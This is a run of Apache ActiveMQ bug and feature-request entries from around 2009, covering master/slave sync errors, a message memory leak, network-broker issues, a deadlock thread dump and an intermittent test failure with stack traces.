I"m seeing exceptions like this in a simple master/slave setup:ERROR Service                        - Async error occurred: javax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:DUL1SJAMES-L2-1231-1233929569359-0:4:1:1:207) was not in the pending list for MasterSlaveBugjavax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:DUL1SJAMES-L2-1231-1233929569359-0:4:1:1:207) was not in the pending list for MasterSlaveBugThe problem only happens when there are multiple consumers listening to the queue, and is more likely to occur as there are more consumers listening.  I"ve written a test program that demonstrates the problem.I start the master and slave with an empty data directory and let them both startup and settle.  Then start the test program.  The test program creates a specified number of consumers, and then starts queuing 256 messages.  The consumers process the message by sending a reply.  The producer counts the replies.  Both consumers and the producer see all the messages, but with multiple consumers it is very likely that the error above will occur and several of the messages will still be queued on the slave.While debugging through the activemq code, I noticed that both the master and the slave dispatch the message to a consumer"s pending list independently.  In other words, it is possible that the master will add the message to consumer A"s pending list and the slave will add the message to consumer B"s pending list.  Once the message has been processed by consumer A, the master sends a message to the slaving which specifies consumer A so that the slave can remove the message.  The slave looks on its copy of consumer A"s pending list and cannot find the message.  As a result, it throws this exception and the message stays stuck on consumer B"s pending list on the slave.Master and slave configurations along with MasterSlaveBug.java are attached to this issue.Start master and slave brokers:activemq xbean:master.xmlactivemq xbean:slave.xmlRun with (only one consumer, the bug does not appear):   java -classpath .:activemq-all-5.2.0.jar MasterSlaveBug 1Run with (sixteen consumers, the bug does appear):   java -classpath .:activemq-all-5.2.0.jar MasterSlaveBug 16
issueID:AMQ-2103
type:Bug
changed files:
texts:Memory leak when marshaling ActiveMQTextMessage to persistent store
When an org.apache.activemq.command.ActiveMQTextMessage is marshaled into the persistence store some portion of the messages are stored in memory (i.e. pending cursor/consumer dispatch queue).  The messages stored in memory have the potential to cause the broker to run out of memory because org.apache.activemq.command.ActiveMQTextMessage objects can store the data twice, once in the "text" field and once in the "content" field.  Normally this isn"t a problem since the "content" field is cleared when the message is being used in a client application (i.e. by calling getText() clears content).  The problem occurs when a consumer is slow and a large number of messages are sitting around on the broker in pending/dispatch memory space.  The message is marshaled for the store and then persisted to disk and copied to pending memory when space is available.This bug affects any ActiveMQ*Message object that does not clear its temporary data (i.e. "text" field) once it has been marshaled.  When a message is marshaled we should null the derived objects memory space once the data has been written to the parent object"s "content" field.
issueID:AMQ-2104
type:Bug
changed files:
texts:Message relay issue when have network of brokers and downstream consumers using same queue/topic but different selectors
There appears to be an issue with message distribution in a network of brokers. Specificallyit seems the producer broker does not honor the downstream subscription, granular to the message selector specified in the consumers subscription,(rather it sends messages to the broker with a consumer based on the Topic or Queue name only).
issueID:AMQ-2105
type:New Feature
changed files:
texts:Add support for rpm distribution
Todo:  Create separate rpm maven project move config, scripts, documentation from the jar project14:57 < Sherriff> Have you thought about distribution with for example rpm? 14:58 < Sherriff> gtully: It seems to be working a lot better without systemUsage and destinationPolicy defined. Thanks alot  14:58 < rajdavies> Sherriff: yeah - would be a good idea14:59 < Sherriff> rajdavies: Do you use Maven2 to build it now? 14:59 < rajdavies> Sherriff: yep15:00 < Sherriff> Cool. 15:00 < Sherriff> If you would like I can set up an rpm-project based on appassembler-m-p and unix-m-p. 15:01 < Sherriff> for you. 15:01 < rajdavies> Sherriff: that would be awesome!15:02 < Sherriff> It use Java Service Wrapper and some (a bit outdated doc) can be found here: http://wiki.community.objectware.no/display/smidigtonull/RPM+Deployment+with+Java+Service+Wrapper 15:02 < Sherriff> The project setup would then be 1. jar-project and 2. rpm-project.  15:03 < Sherriff> 2. Would contain config file, readmes, etc. and the start/stop scripts are generated by appassembler. I can probably do most of the work since I already have working rpm setup that I use for other projects.
issueID:AMQ-2106
type:New Feature
changed files:
texts:Allow broker to evenly distribute message groups among consumers
Currently the broker will not reassign message groups if new consumers becomes available (or existing ones are removed). We could allow the broker to try reassign the message groups when consumers are added/removed so that we have a even distribution among consumers.
issueID:AMQ-2109
type:Bug
changed files:
texts:Proxy Consumers are not closed when a consumer closes on a networked broker
This error occurs, when we have two brokers BrokerA and BrokerB. The simplest case is BrokerA being networked to BrokerB with a static network connector. If a consumer is created on BrokerB for a queue TEST, we will also note a consumer being established on BrokerA for that Queue, which is the intended behavior. If the consumer is closed on BrokerB, the proxy consumer on BrokerA continues to exist. Now consider the client reconnects due to failover reasons to BrokerA this time. BrokerA would then have 2 consumers on TEST, causing a portion of the messages being consumed by the proxy consumer. So, when a consumer is closed for a queue, the proxy consumers in the peer brokers should also be closed.
issueID:AMQ-2111
type:Bug
changed files:
texts:NPE on asyncDispatch of topic - default config for Network subscriptions - intermittent failure of MultiBrokersMultiClientsTest
org.apache.activemq.usecases.MultiBrokersMultiClientsTest some times fails with:java.lang.NullPointerException at org.apache.activemq.openwire.v5.BaseDataStreamMarshaller.tightMarshalObjectArray2(BaseDataStreamMarshaller.java:369) at org.apache.activemq.openwire.v5.MessageMarshaller.tightMarshal2(MessageMarshaller.java:191) at org.apache.activemq.openwire.v5.ActiveMQMessageMarshaller.tightMarshal2(ActiveMQMessageMarshaller.java:90) at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject2(OpenWireFormat.java:430) at org.apache.activemq.openwire.v5.BaseDataStreamMarshaller.tightMarshalNestedObject2(BaseDataStreamMarshaller.java:136) at org.apache.activemq.openwire.v5.MessageDispatchMarshaller.tightMarshal2(MessageDispatchMarshaller.java:105) at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:240) at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:166) at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:237) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:83) at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:100) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1216) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:800) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:837) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:613)
issueID:AMQ-2113
type:Improvement
changed files:Main.java
texts:Output the JVM info being used by ActiveMQ
It would be helpful to output information about the JVM being used by ActiveMQ when it is started. Below is an example: $ ./bin/activemqJava Runtime: Apple Inc. 1.5.0_16 /System/Library/Frameworks/JavaVM.framework/Versions/1.5.0/Home  Heap sizes: current=2031616k  free=1464368k  max=532742144k    JVM args: -Xmx512M -Dorg.mortbay.log.class=com.sun.org.apache.commons.logging.impl.NoOpLog -Dorg.apache.activemq.UseDedicatedTaskRunner=false -Dcom.sun.management.jmxremote -Dactivemq.classpath=/Users/bsnyder/src/activemq/trunk/assembly/target/apache-activemq-5.3-SNAPSHOT/conf; -Dactivemq.home=/Users/bsnyder/src/activemq/trunk/assembly/target/apache-activemq-5.3-SNAPSHOT -Dactivemq.base=/Users/bsnyder/src/activemq/trunk/assembly/target/apache-activemq-5.3-SNAPSHOTACTIVEMQ_HOME: /Users/bsnyder/src/activemq/trunk/assembly/target/apache-activemq-5.3-SNAPSHOTACTIVEMQ_BASE: /Users/bsnyder/src/activemq/trunk/assembly/target/apache-activemq-5.3-SNAPSHOT...
issueID:AMQ-2119
type:Bug
changed files:TransportConnection.java
texts:SocketException: Broken pipe should be logged as warning not debug
Network problems are imho important. Can they be logged at WARN instead of debug? 2009-02-17 08:57:43,241 DEBUG &#91;broker.TransportConnection.Transport&#93; Transport failed: java.net.SocketException: Broken pipejava.net.SocketException: Broken pipe        at java.net.SocketOutputStream.socketWrite0(Native Method)        at java.net.SocketOutputStream.socketWrite(Unknown Source)        at java.net.SocketOutputStream.write(Unknown Source)        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)        at java.io.DataOutputStream.flush(Unknown Source)        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:167)        at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:233)        at org.apache.activemq.transport.InactivityMonitor$3.run(InactivityMonitor.java:135)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)        at java.lang.Thread.run(Unknown Source)
issueID:AMQ-2120
type:Improvement
changed files:
texts:Implement ActiveMQ.Advisory.NoConsumer.Queue
Although is documented, messages sent to queues without consumers are not sent to the appropriate advisory topics. It should behave the same as no consumer topic feature (send only non-persistent messages)
issueID:AMQ-2121
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Occasional Deadlock in DuplexNetworkMBeanTest - contention on brokerService with NetworkConnector
Full thread dump Java HotSpot(TM) Client VM (1.5.0_16-133 mixed mode, sharing):"InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@7cf915" daemon prio=5 tid=0x01027240 nid=0x97a400 waiting on condition [0xb169e000..0xb169ed90] at sun.misc.Unsafe.park(Native Method) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireNanos(AbstractQueuedSynchronizer.java:807) at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(AbstractQueuedSynchronizer.java:1122) at java.util.concurrent.SynchronousQueue$Node.waitForPut(SynchronousQueue.java:291) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:443) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:475) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:674) at java.lang.Thread.run(Thread.java:613)"ActiveMQ Transport: tcp://localhost/127.0.0.1:61617" prio=5 tid=0x0102ea70 nid=0x97b200 waiting for monitor entry [0xb18a2000..0xb18a2d90] at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:391) - waiting to lock <0x0c0bb940> (a java.lang.Object) at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:223) at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:108) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:376) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:85) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:546) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:112) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x0c0daa80> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:607) at org.apache.activemq.network.DemandForwardingBridgeSupport.addConsumerInfo(DemandForwardingBridgeSupport.java:935) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:544) - locked <0x0c0761a0> (a org.apache.activemq.xbean.XBeanBrokerService) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:442) at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:166) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) - locked <0x0c0ceb80> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:613)"ActiveMQ Data File Writer" daemon prio=10 tid=0x0102d9f0 nid=0x989a00 in Object.wait() [0xb0f90000..0xb0f90d90] at java.lang.Object.wait(Native Method) - waiting on <0x0c0b79f8> (a org.apache.activemq.kaha.impl.async.DataFileAppender$1) at java.lang.Object.wait(Object.java:474) at org.apache.activemq.kaha.impl.async.NIODataFileAppender.processQueue(NIODataFileAppender.java:79) - locked <0x0c0b79f8> (a org.apache.activemq.kaha.impl.async.DataFileAppender$1) at org.apache.activemq.kaha.impl.async.DataFileAppender$2.run(DataFileAppender.java:227)..."VMTransport" daemon prio=5 tid=0x01028030 nid=0x9b8000 waiting for monitor entry [0xb171f000..0xb171fd90] at org.apache.activemq.broker.BrokerService.getTempDataStore(BrokerService.java:1187) - waiting to lock <0x0c0761a0> (a org.apache.activemq.xbean.XBeanBrokerService) at org.apache.activemq.broker.region.RegionBroker.getTempDataStore(RegionBroker.java:646) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.<init>(FilePendingMessageCursor.java:72) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.<init>(StoreDurableSubscriberCursor.java:66) at org.apache.activemq.broker.region.DurableTopicSubscription.<init>(DurableTopicSubscription.java:55) at org.apache.activemq.broker.region.TopicRegion.createSubscription(TopicRegion.java:241) at org.apache.activemq.broker.jmx.ManagedTopicRegion.createSubscription(ManagedTopicRegion.java:44) at org.apache.activemq.broker.region.TopicRegion.addSubscriptionsForDestination(TopicRegion.java:175) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:129) - locked <0x0c0bb940> (a java.lang.Object) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:264) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:149) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149) at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:331) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:90) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:90) at org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:138) at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56) at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:97) at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:505) at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:204) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:613)"Reference Handler" daemon prio=10 tid=0x010075f0 nid=0x813e00 in Object.wait() [0xb0984000..0xb0984d90] at java.lang.Object.wait(Native Method) - waiting on <0x0bcfc660> (a java.lang.ref.Reference$Lock) at java.lang.Object.wait(Object.java:474) at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116) - locked <0x0bcfc660> (a java.lang.ref.Reference$Lock)"main" prio=5 tid=0x010014b0 nid=0xb0801000 waiting on condition [0xb07fe000..0xb0800148] at sun.misc.Unsafe.park(Native Method) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1841) at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:341) at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40) at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:80) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1244) at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1691) - locked <0x0c0e0c20> (a java.lang.Object) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231) at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241) at org.apache.activemq.network.SimpleNetworkTest.testFiltering(SimpleNetworkTest.java:102) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at junit.framework.TestCase.runTest(TestCase.java:154) at junit.framework.TestCase.runBare(TestCase.java:127) at junit.framework.TestResult$1.protect(TestResult.java:106) at junit.framework.TestResult.runProtected(TestResult.java:124) at junit.framework.TestResult.run(TestResult.java:109) at junit.framework.TestCase.run(TestCase.java:118) at junit.framework.TestSuite.runTest(TestSuite.java:208) at junit.framework.TestSuite.run(TestSuite.java:203) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160) at org.apache.maven.surefire.Surefire.run(Surefire.java:81) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182) at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)"VM Thread" prio=9 tid=0x01006d40 nid=0x813000 runnable "VM Periodic Task Thread" prio=9 tid=0x01009b90 nid=0x805800 waiting on condition "Exception Catcher Thread" prio=10 tid=0x01001700 nid=0x80ac00 runnable Found one Java-level deadlock:============================="ActiveMQ Transport: tcp://localhost/127.0.0.1:61617":  waiting to lock monitor 0x00814e44 (object 0x0c0bb940, a java.lang.Object),  which is held by "VMTransport""VMTransport":  waiting to lock monitor 0x00814e68 (object 0x0c0761a0, a org.apache.activemq.xbean.XBeanBrokerService),  which is held by "ActiveMQ Transport: tcp://localhost/127.0.0.1:61617"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: tcp://localhost/127.0.0.1:61617": at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:391) - waiting to lock <0x0c0bb940> (a java.lang.Object) at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:223) at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:108) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:376) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:85) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:546) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:112) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x0c0daa80> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:607) at org.apache.activemq.network.DemandForwardingBridgeSupport.addConsumerInfo(DemandForwardingBridgeSupport.java:935) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:544) - locked <0x0c0761a0> (a org.apache.activemq.xbean.XBeanBrokerService) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:442) at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:166) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) - locked <0x0c0ceb80> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:613)"VMTransport": at org.apache.activemq.broker.BrokerService.getTempDataStore(BrokerService.java:1187) - waiting to lock <0x0c0761a0> (a org.apache.activemq.xbean.XBeanBrokerService) at org.apache.activemq.broker.region.RegionBroker.getTempDataStore(RegionBroker.java:646) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.<init>(FilePendingMessageCursor.java:72) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.<init>(StoreDurableSubscriberCursor.java:66) at org.apache.activemq.broker.region.DurableTopicSubscription.<init>(DurableTopicSubscription.java:55) at org.apache.activemq.broker.region.TopicRegion.createSubscription(TopicRegion.java:241) at org.apache.activemq.broker.jmx.ManagedTopicRegion.createSubscription(ManagedTopicRegion.java:44) at org.apache.activemq.broker.region.TopicRegion.addSubscriptionsForDestination(TopicRegion.java:175) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:129) - locked <0x0c0bb940> (a java.lang.Object) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:264) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:149) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149) at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:331) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:90) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:90) at org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:138) at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56) at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:97) at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:505) at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:204) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:613)Found 1 deadlock.
issueID:AMQ-2123
type:Bug
changed files:
texts:Intermittent Test failure: DuplexNetworkTest.testDurableStoreAndForward  (org.apache.activemq.network) - java.lang.IllegalStateException: Message id ID:... could not be recovered from the data store - already dispatched
DuplexNetworkTest.testDurableStoreAndForward  (org.apache.activemq.network)    javax.jms.JMSException: java.lang.RuntimeException: java.lang.IllegalStateException: Message id ID:pdrhas4_32-40202-1234575036513-14:8:1:1:3 could not be recovered from the data store - already dispatched    at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)    at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)    Show details »    « Hide details    javax.jms.JMSException: java.lang.RuntimeException: java.lang.IllegalStateException: Message id ID:pdrhas4_32-40202-1234575036513-14:8:1:1:3 could not be recovered from the data store - already dispatched    at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)    at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)    at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1805)    at org.apache.activemq.ActiveMQMessageConsumer.&init&(ActiveMQMessageConsumer.java:225)    at org.apache.activemq.ActiveMQTopicSubscriber.&init&(ActiveMQTopicSubscriber.java:117)    at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1207)    at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1152)    at org.apache.activemq.network.SimpleNetworkTest.testDurableStoreAndForward(SimpleNetworkTest.java:127)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)    at java.lang.reflect.Method.invoke(Method.java:585)    at junit.framework.TestCase.runTest(TestCase.java:154)    at junit.framework.TestCase.runBare(TestCase.java:127)    at junit.framework.TestResult$1.protect(TestResult.java:106)    at junit.framework.TestResult.runProtected(TestResult.java:124)    at junit.framework.TestResult.run(TestResult.java:109)    at junit.framework.TestCase.run(TestCase.java:118)    at junit.framework.TestSuite.runTest(TestSuite.java:208)    at junit.framework.TestSuite.run(TestSuite.java:203)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)    at java.lang.reflect.Method.invoke(Method.java:585)    at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160)    at org.apache.maven.surefire.Surefire.run(Surefire.java:81)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)    at java.lang.reflect.Method.invoke(Method.java:585)    at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182)    at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)    Caused by: java.lang.RuntimeException: java.lang.RuntimeException: java.lang.IllegalStateException: Message id ID:pdrhas4_32-40202-1234575036513-14:8:1:1:3 could not be recovered from the data store - already dispatched    at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:104)    at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.reset(StoreDurableSubscriberCursor.java:225)    at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:560)    at 